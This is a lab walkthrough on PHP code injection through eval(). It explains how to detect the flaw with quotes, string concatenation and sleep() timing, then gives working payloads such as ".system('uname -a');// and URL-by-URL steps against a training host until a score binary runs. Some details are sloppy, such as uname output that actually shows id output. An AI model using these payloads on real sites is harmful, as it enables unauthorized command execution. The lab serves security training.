Code Execution 01 

Code injection

In this section, we are going to work on code execution. Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code as part of the data you are sending to the application. For example, if you want to run the command ls, you will need to send system("ls") to the application if it is a PHP application.

Just like other examples of web application issues, it's always handy to know how to comment out the rest of the code (i.e.: the suffix that the application will add to the user-controlled data). In PHP, you can use // to get rid of the code added by the application.

As with SQL injection, you can use the same value technique to test and ensure you have a code injection:

    By using comments and injecting /* random value */.
    By injecting a simple concatenation "." (where " are used to break the syntax and reform it correctly).
    By replacing the parameter you provided by a string concatenation, for example "."ha"."cker"." instead of hacker.

You can also use time-based detection for this issue by using the PHP function sleep. You will see a time difference between:

    Not using the function sleep or calling it with a delay of zero: sleep(0).
    A call to the function with a long delay: sleep(10).

Obviously, the code injection should be in the language used by the application. Therefore, the first step in an injection is to find what language is used by the application. To do so you can look at the response's headers, generate errors or look at the way special characters are handle by the application (for example by comparing + and . for concatenation of strings.

This example is a trivial code injection. If you inject a single quote, nothing happens. However, you can get a better idea of the problem by injecting a double quote:

Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/index.php(6) : eval()'d 
code on line 1

*  This could be the other way around; the single quote could generate an error where the double quote may not. 

Based on the error message, we can see that the code is using the function eval: "Eval is evil...".

We saw that the double quote breaks the syntax, and that the function eval seems to be using our input. From this, we can try to work out payloads that will give us the same results:

    ".": we are just adding a string concatenation; this should give us the same value.
    "./*pentesterlab*/": we are just adding a string concatenation and information inside comments; this should give us the same value.

Now that we have similar values working, we need to inject code. To show that we can execute code, we can try to run a command (for example uname -a using the code execution). The full PHP code looks like:

system('uname -a');

The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:

    By adding dummy code: ".system('uname -a'); $dummy=".
    By using comment: ".system('uname -a');# or ".system('uname -a');//.

Don't forget that you will need to URL-encode some of the characters (# and ;) before sending the request.


Common Mistakes:

    - Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-5fbe7bc0-37dac756.libcurl.so/. 

Steps:
 1) Visit the given url: http://ptc-5fbe7bc0-37dac756.libcurl.so/. 
 2) We got a hacker parameter. If we put double quote ("), we get the error message .syntax
     Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/index.php(16) : eval()'d code on line 1
 3) We know it's php application and there is a call to enval. 
 
 4) http://ptc-5fbe7bc0-37dac756.libcurl.so/?name=hacker"."blah"."
 See it reflects as:  Hello hackerblah!!!
The objective of this exercise is to exploit the code execution in this page. 
5) Let's try some changes with uname code in the this parameter. Replace "blah" with system("uname -a").
   http://ptc-5fbe7bc0-37dac756.libcurl.so/?name=hacker".system("uname -a")."
 You may see: 
 uid=33(www-data) gid=33(www-data) groups=33(www-data) Hello hackeruid=33(www-data) gid=33(www-data) groups=33(www-data)!!!
 
 6) For a kind information we can use different linux command instead. It will makes more easier to learn in fact. 
    From this we should be able to replace uname-a with /user/local/bin/score. This is core command with our UUID. 
    So then add UUID value in this parameter which looks as:
    http://ptc-5fbe7bc0-37dac756.libcurl.so/?name=hacker".system("/usr/local/bin/score UUID")."

7)  Now, replace UUID with (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as given in lab.
    It seems: http://ptc-5fbe7bc0-37dac756.libcurl.so/?name=hacker".system("/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8")."
8) Bravo!!  Exercise completed!! Hello hacker!!! 

Happy Hacking!! :) 
    
